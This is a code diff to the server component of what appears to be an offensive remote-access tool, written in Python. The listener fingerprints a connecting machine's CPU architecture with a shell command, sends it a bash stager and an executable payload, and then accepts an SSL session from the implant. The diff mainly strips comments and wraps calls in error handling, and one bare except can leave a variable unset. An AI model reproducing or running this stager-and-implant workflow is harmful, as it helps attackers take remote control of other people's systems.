@@ -114,7 +114,6 @@ class Server:
 
 
     def craft_payload(self,device_arch):
-        # TODO: Detect uid before we send executable
         if not self.host:
             h.info_error("Local host is not set!")
             return
@@ -153,10 +152,8 @@ class Server:
             return
 
     def listen_for_stager(self):
-        #craft shell script
         identification_shell_command = 'com=$(uname -p); if [ $com != "unknown" ]; then echo $com; else uname; fi\n'
         
-        #listen for connection
         s = socket.socket()
         s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         s.bind(('0.0.0.0', self.port))
@@ -168,24 +165,24 @@ class Server:
             s.close()
             return
 
-        # identify device
         hostAddress = addr[0]
         self.verbose_print("Connecting to "+hostAddress+"...")
         conn.send(identification_shell_command.encode())
-        device_arch = conn.recv(128).decode().strip()
+        try:
+            device_arch = conn.recv(128).decode().strip()
+        except:
+            pass
         if not device_arch:
             return
 
-        # send bash stager
-        #try:
-        bash_stager, executable = self.craft_payload(device_arch)
-        #except Exception as e:
-        #    input("Press enter to continue...").strip(" ")
-        #    return
+        try:
+            bash_stager, executable = self.craft_payload(device_arch)
+        except Exception as e:
+            input("Press enter to continue...").strip(" ")
+            return
         self.debug_print(bash_stager.strip())
         conn.send(bash_stager.encode())
 
-        # send executable
         conn.send(executable)
         conn.close()
         self.verbose_print("Establishing Connection...")
@@ -201,7 +198,6 @@ class Server:
 
 
     def listen_for_executable_payload(self,s):
-        # accept connection
         ssl_con, hostAddress = s.accept()
         s.settimeout(5)
         ssl_sock = ssl.wrap_socket(ssl_con,
@@ -220,5 +216,3 @@ class Server:
         old_session.hostname = new_session.hostname
         old_session.username = new_session.username
         old_session.type = new_session.type
-
-   
